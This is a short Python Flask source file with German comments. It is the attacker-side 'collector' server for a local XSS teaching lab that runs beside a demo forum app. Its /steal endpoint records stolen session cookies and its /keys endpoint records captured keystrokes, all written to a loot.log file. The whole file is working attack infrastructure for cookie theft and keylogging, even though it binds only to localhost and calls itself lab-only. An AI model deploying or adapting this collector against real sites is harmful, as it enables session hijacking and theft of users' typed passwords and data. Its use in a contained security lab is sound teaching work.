"""Sammel-Server für die XSS-Demo (Angreifer-Seite) — nur lokal im Lab.

Nimmt geklaute Cookies / getippte Tasten entgegen und schreibt sie in loot.log.
Läuft auf Port 5001, damit es neben dem Cowboy-Forum (5000) parallel laufen kann.

    python collector.py
    -> lauscht auf http://127.0.0.1:5001/steal  und  /keys
"""
from datetime import datetime

from flask import Flask, request

app = Flask(__name__)
LOOT = "loot.log"


def log(kind: str, data: str, src: str) -> None:
    line = f"[{datetime.now():%H:%M:%S}] {kind} von {src}: {data}\n"
    with open(LOOT, "a", encoding="utf-8") as fh:
        fh.write(line)
    print(line, end="")


@app.route("/steal")
def steal():
    log("COOKIE", request.args.get("c", ""), request.remote_addr)
    return "", 204


@app.route("/keys", methods=["GET", "POST"])
def keys():
    data = request.args.get("k") or request.get_data(as_text=True)
    log("KEYS", data, request.remote_addr)
    return "", 204


if __name__ == "__main__":
    # Angreifer-Sammelstelle. Nur im lokalen Lab.
    app.run(host="127.0.0.1", port=5001)
